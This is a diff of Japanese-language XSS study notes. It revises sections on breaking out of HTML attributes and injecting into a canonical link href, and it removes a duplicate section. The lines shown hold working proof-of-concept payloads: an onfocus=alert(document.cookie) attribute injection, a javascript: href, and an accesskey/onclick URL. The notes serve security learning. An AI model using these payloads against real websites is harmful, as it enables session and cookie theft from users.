@@ -127,7 +127,7 @@ custom tagを使用してエクスプロイトサーバにホストし、deliver
 
 ## HTMLタグ属性内への注入
 
-`<>` は注入できなくても引用符を注入できる場合、新たな属性を追加する。
+`<>` は注入できなくても引用符を注入できる場合に、新たな属性を追加してエクスプロイトする。
 
 > [!WARNING] 
 >[ブラウザ開発者ツール](ブラウザ開発者ツール.md)で注入後のcontextを確認し、文法を維持すること。
@@ -136,9 +136,7 @@ custom tagを使用してエクスプロイトサーバにホストし、deliver
 ```html
 <input type="text" value="<user_input>" name="username">
 ```
-
-に対して：
-
+	↓
 ```html
 <input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username">
 ```
@@ -155,19 +153,15 @@ custom tagを使用してエクスプロイトサーバにホストし、deliver
 
 1. `<head>` タグ内に `canonical` が設定されていることを確認する
 2. クエリストリングを検索し、`<link rel="canonical" href="">` のhrefに反映されるか確認する
-
 ```html
-<link rel="canonical" href='https://example/?aaa'/>
+<link rel="canonical" href='https://<example>/?aaa'/>
 ```
 
 3. hrefへの反映を悪用してペイロードを注入する
-
-```
+```html
 http://example/?'accesskey='x'onclick='alert(1)
 ```
-
 ↓
-
 ```html
 <link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
 ```
@@ -470,29 +464,7 @@ GET /?search=<有効なタグ%20§§=1> HTTP/2
 ```
 
 ---
-## HTMLタグ属性内のXSS
 
-- `<>`は注入不可でも、引用符を注入できる場合、新たな属性を追加する
-🚨開発者ツールで注入後のコンテキストを確認し、文法は維持すること
-
-- 例
-```html
-<input type="text" value="user_input_here" name="username"> 
-```
-	↓
-```html
-<input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username"> 
-```
-
-### href属性のケース
-
-```html
-<a href="javascript:alert(document.cookie)">
-```
-- ↓リンクをクリックしたらスクリプトが実行される
-![[Pasted image 20231226192331.png | 200]]
-
----
 ### headタグ内にcanonicalが設定されているケース
 
 1. `<head>`タグ内に`canonical`が設定されていることを確認する
